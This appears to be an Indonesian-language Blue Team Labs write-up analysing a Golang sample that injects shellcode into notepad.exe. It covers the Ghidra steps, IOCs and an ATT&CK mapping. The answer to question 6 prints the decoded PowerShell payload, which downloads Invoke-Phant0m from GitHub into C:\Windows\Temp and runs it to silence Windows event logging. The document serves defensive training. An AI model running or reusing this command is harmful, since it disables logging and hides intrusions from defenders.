# Reverse Engineering - Another Injection — BTLO

> **Platform:** [Blue Team Labs Online](https://blueteamlabs.online/home/challenge/reverse-engineering-another-injection-72001745c9)  
> **Category:** Reverse Engineering / Malware Analysis  
> **Difficulty:** Hard  
> **Status:** ✅ Completed  
> **Date:** 2026-05-24  
> **Time Spent:** ~3 jam  
> **Tags:** `Golang` `Shellcode Injection` `Ghidra` `Process Injection` `Event Log Tampering`

---

## 📌 Prolog

Challenge ini masuk kategori berat — binary-nya ditulis dalam Golang, yang punya struktur internal berbeda dari C/C++ dan perlu sedikit orientasi lebih di Ghidra. Tekniknya adalah shellcode injection ke `notepad.exe` yang berujung ke download dan eksekusi Invoke-Phant0m untuk membungkam Windows Event Log. Chain-nya menarik: dari binary Golang → injeksi ke proses legitimate → PowerShell tersembunyi → tool anti-forensic.

---

## 🎯 Scenario

Ada banyak teknik injection yang digunakan oleh malware yang diimplementasikan dalam berbagai teknologi. Analisis sampel yang menggunakan teknik injection dan temukan apa saja aksi yang dilakukannya.

---

## ❓ Questions

1. What is the language the program is written?
2. What is the build id?
3. What is the dependency package the sample uses for invoking Windows APIs?
4. What is the victim process? (Hint: 32bit)
5. What is the process invoked from the shellcode?
6. What is the name of the created file?
7. What is the name of the actual tool executed?

---

## 🔍 Answer & Walkthrough

### Overview: Flow Eksekusi Malware

```
Binary Golang dijalankan
    ↓
main.getpid() → cari PID proses notepad.exe (32-bit)
    ↓
Windows API via kernel32.dll:
    OpenProcess()       → buka handle ke notepad.exe
    VirtualAllocEx()    → alokasi memory di notepad.exe
    WriteProcessMemory()→ tulis shellcode ke memory notepad.exe
    CreateRemoteThread()→ eksekusi shellcode di notepad.exe
    ↓
Shellcode dieksekusi di dalam notepad.exe:
    powershell -ep bypass -W hidden -enc [Base64 payload]
    ↓
PowerShell decode payload → Invoke-WebRequest download Invoke-Phant0m
    ↓
Simpan ke: C:\Windows\Temp\change.ps1
    ↓
Import-Module + Invoke-Phant0m → event log tampering dijalankan
```

### Cara Analisis dengan Ghidra

1. Buka binary di Ghidra → auto-analyze
2. Search function `main.main` di Symbol Tree
3. Identifikasi string `notepad.exe` di `main.getpid()`
4. Trace `DAT_005046fa` untuk menemukan shellcode PowerShell
5. Copy Base64 encoded command → decode di CyberChef (**From Base64 → Decode Text UTF-16LE**)

---

### 1. What is the language the program is written?

Binary bisa diidentifikasi sebagai Golang dari Build ID dan struktur internal-nya yang khas — termasuk goroutine scheduler dan garbage collector yang terlihat di Ghidra. Golang menghasilkan binary self-contained tanpa perlu DLL runtime eksternal.

**Jawaban:** `Golang`

---

### 2. What is the build id?

Cek section binary atau search string "build id" di Ghidra. Build ID adalah identifier unik yang di-embed compiler Golang ke dalam binary saat kompilasi.

**Jawaban:** `eck19EyXq_9c975RxNJ1/QkbhfvYWoTcAeJreFwhX/q3HwQW17YdD3iMlLFCzB/1ZpNy-9ah0QEvzlOTFcq`

---

### 3. What is the dependency package the sample uses for invoking Windows APIs?

Search imported packages di strings binary atau di section Go build info. Package ini adalah wrapper Golang untuk Windows API yang memungkinkan malware memanggil fungsi seperti `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, dan `CreateRemoteThread` langsung dari kode Golang.

**Jawaban:** `github.com/TheTitanrain/w32`

---

### 4. What is the victim process? (Hint: 32bit)

Analisis function `main.getpid()` di Ghidra. Di sana ditemukan:

```
local_18 = &DAT_004db094;
uStack_10 = 0xb;
```

Resolve pointer `DAT_004db094` → menunjuk ke string `notepad.exe`. Notepad dipilih karena merupakan proses 32-bit yang selalu ada di Windows dan jarang dicurigai sebagai proses berbahaya.

**Jawaban:** `notepad.exe`

---

### 5. What is the process invoked from the shellcode?

Di `main.main()`, ditemukan:

```
runtime.duffcopy(..., &DAT_005046fa)
```

Trace `DAT_005046fa` → data di address `005047a8` membentuk string:

```
70 6f 77 65 72 73 68 65 6c 6c  →  "powershell -ep bypass -W hidden -enc ..."
```

Flag `-ep bypass` menonaktifkan execution policy, `-W hidden` menyembunyikan window PowerShell dari user.

**Jawaban:** `powershell.exe`

---

### 6. What is the name of the created file?

Decode Base64 payload dari shellcode di CyberChef (**From Base64 → Decode Text UTF-16LE**). Hasil decode:

```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1" -OutFile "C:\Windows\Temp\change.ps1"; Import-Module C:\Windows\Temp\change.ps1; Invoke-Phant0m;
```

File di-download dari GitHub dan disimpan ke lokasi Temp yang jarang dipantau.

**Jawaban:** `C:\Windows\Temp\change.ps1`

---

### 7. What is the name of the actual tool executed?

Lihat perintah terakhir setelah `Import-Module` pada payload yang sudah di-decode. **Invoke-Phant0m** adalah tool PowerShell untuk event log tampering — menonaktifkan Windows Event Log service dengan cara mematikan thread-thread yang bertanggung jawab untuk logging, sehingga jejak aktivitas malware tidak terekam.

**Jawaban:** `Invoke-Phant0m`

---

## 🚨 Key Findings / IOCs

| Tipe | Value | Keterangan |
|------|-------|------------|
| Build ID | `eck19EyXq_9c975RxNJ1/...` | Identifier unik binary Golang |
| Package | `github.com/TheTitanrain/w32` | Windows API wrapper untuk Golang |
| Target Process | `notepad.exe` | Victim process untuk shellcode injection |
| File | `C:\Windows\Temp\change.ps1` | Lokasi penyimpanan Invoke-Phant0m |
| Tool | `Invoke-Phant0m` | Tool event log tampering |
| URL | `raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1` | Sumber download payload |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Keterangan |
|--------|-----------|----|------------|
| Defense Evasion | Process Injection: Shellcode Injection | T1055.004 | Injeksi shellcode ke `notepad.exe` |
| Defense Evasion | Impair Defenses: Disable Windows Event Logging | T1562.002 | Invoke-Phant0m matikan thread event logging |
| Defense Evasion | Obfuscated Files or Information | T1027 | Payload di-encode Base64 UTF-16LE |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Shellcode menjalankan PowerShell tersembunyi |
| Command and Control | Ingress Tool Transfer | T1105 | Download `Invoke-Phant0m.ps1` dari GitHub |

---

## 📋 Summary — Attacker Behavior & Todo

### Attacker Behavior

Binary Golang ini mengeksekusi shellcode injection ke `notepad.exe` — proses 32-bit yang legitimate dan tidak mencurigakan. Untuk berinteraksi dengan Windows API, malware menggunakan package `github.com/TheTitanrain/w32` sebagai wrapper, memanggil chain klasik injection: `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`. Shellcode yang diinjeksikan berisi perintah PowerShell dengan payload Base64 UTF-16LE yang, setelah di-decode, men-download **Invoke-Phant0m** dari GitHub dan menyimpannya ke `C:\Windows\Temp\change.ps1`. Tool ini kemudian dieksekusi untuk mematikan thread-thread Windows Event Log — langkah anti-forensic yang memastikan aktivitas malware tidak terekam di event log.

### Todo / Follow-up

- [ ] Pelajari lebih dalam cara reverse engineering binary Golang di Ghidra (goroutine, type info)
- [ ] Eksplorasi teknik shellcode injection lainnya: Process Hollowing, Thread Hijacking
- [ ] Analisis lebih dalam cara kerja Invoke-Phant0m dalam mematikan Event Log thread
- [ ] Buat detection rule untuk mendeteksi pola `OpenProcess` + `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` via Sysmon (Event ID 8, 10)

---

## 📚 References

- [MITRE ATT&CK — T1055.004 Shellcode Injection](https://attack.mitre.org/techniques/T1055/004/)
- [MITRE ATT&CK — T1562.002 Disable Windows Event Logging](https://attack.mitre.org/techniques/T1562/002/)
- [Invoke-Phant0m — GitHub](https://github.com/hlldz/Invoke-Phant0m)
- [TheTitanrain/w32 — GitHub](https://github.com/TheTitanrain/w32)
- [BTLO — Reverse Engineering: Another Injection](https://blueteamlabs.online/home/challenge/reverse-engineering-another-injection-72001745c9)

---

*Writeup ini dibuat sebagai bagian dari perjalanan belajar Blue Team / SOC Analyst.*
